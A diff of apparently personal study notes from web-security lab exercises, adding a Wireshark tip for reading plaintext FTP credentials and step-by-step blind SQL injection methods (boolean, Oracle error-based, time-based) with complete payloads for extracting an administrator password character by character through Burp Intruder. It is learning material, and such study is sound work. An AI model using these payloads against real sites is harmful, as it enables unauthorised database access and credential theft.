@@ -245,6 +245,12 @@ dvwa users table contains MD5 hashed passwords
 admin password hash: 5f4dcc3b5aa765d61d8327deb882cf99 = "password"
 crack hashes: crackstation.net or hashcat in Stage 3
 
+Follow TCP Stream in Wireshark: [DONE]
+right click any packet → Follow → TCP Stream
+shows entire conversation as readable text
+FTP: credentials visible in plaintext
+use this on any captured session to read the full exchange
+
 ======================================================
 SSH
 ======================================================
@@ -532,6 +538,102 @@ Lab 11 — Blind SQLi with conditional responses — DONE
 type: boolean-based blind SQLi
 injection point: tracking cookie (not URL parameter)
 feedback mechanism: "Welcome back" appears = TRUE, disappears = FALSE
+
+Lab 11 — Blind SQLi with conditional responses — DONE
+type: boolean-based blind SQLi
+injection point: tracking cookie not URL parameter
+feedback: Welcome back appears = TRUE, disappears = FALSE
+
+methodology:
+1. confirm injection: ' AND 1=1-- (true) vs ' AND 1=2-- (false)
+2. confirm user: ' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
+3. find length: ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>N)='administrator'--
+   increment N until Welcome back disappears — that N is the length
+4. extract chars: ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),POSITION,1)='CHAR'--
+   use Burp Intruder cluster bomb — position 1-20, chars a-z 0-9
+5. assemble password from results and login
+
+key functions:
+SUBSTRING(string, position, length) — extracts characters
+LENGTH(string)                      — returns string length
+
+Burp Intruder settings:
+attack type: cluster bomb
+payload 1:  numbers 1 to 20 (character positions)
+payload 2:  a-z and 0-9 (characters to test)
+grep match: Welcome back
+result: requests with Welcome back = correct character at that position
+
+Lab 12 — Blind SQLi with conditional errors — Oracle — DONE
+feedback: server error = TRUE, normal page = FALSE
+needed video first to understand CASE WHEN concept
+
+step 1 — confirm database type:
+' AND (SELECT '' FROM dual)='  →  Oracle confirmed
+
+step 2 — confirm conditional errors work:
+TRUE:  ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
+FALSE: ' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
+
+step 3 — confirm administrator exists:
+' AND (SELECT CASE WHEN (username='administrator') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
+
+step 4 — find password length:
+' AND (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>N) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
+
+step 5 — extract characters:
+' AND (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,POS,1)='CHAR') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
+
+key concepts:
+CASE WHEN condition THEN result1 ELSE result2 END — SQL if/else
+TO_CHAR(1/0) — divide by zero forces Oracle error
+SUBSTR(string,pos,len) — Oracle character extraction
+error = TRUE signal, no error = FALSE signal
+
+Burp Intruder: cluster bomb
+payload 1: position 1 to password length
+payload 2: a-z 0-9
+look for: error responses = correct character
+
+Lab 13 — Blind SQLi with time delays — DONE
+feedback: page delay = TRUE, instant response = FALSE
+goal: cause a 10 second delay
+
+payloads by database:
+Oracle:     '|| dbms_pipe.receive_message(('a'),10)--
+MSSQL:      '|| WAITFOR DELAY '0:0:10'--
+PostgreSQL: '|| (SELECT pg_sleep(10))--
+MySQL:      '|| (SELECT SLEEP(10))--
+
+how to identify database: test all four, whichever delays = that database
+this lab: PostgreSQL confirmed
+
+Lab 14 — Blind SQLi time-based information retrieval — DONE
+same as Lab 12 but delay = TRUE instead of error = TRUE
+PostgreSQL uses pg_sleep() not TO_CHAR(1/0)
+|| is PostgreSQL string concatenation
+
+confirm user:
+'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--
+delay = administrator exists
+
+find length:
+'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>N) THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--
+delay = length is greater than N
+
+extract characters:
+'||(SELECT CASE WHEN (username='administrator' AND SUBSTR(password,POS,1)='CHAR') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--
+delay = correct character at that position
+
+PostgreSQL syntax:
+|| = string concatenation
+pg_sleep(seconds) = time delay
+SUBSTR = same as Oracle
+CASE WHEN = same structure as Oracle
+
+difference from in-band SQLi:
+in-band: see results directly on page
+blind:   only true/false signal — extract data character by character
 
 methodology:
 1. confirm injection: ' AND 1=1-- (true) vs ' AND 1=2-- (false)
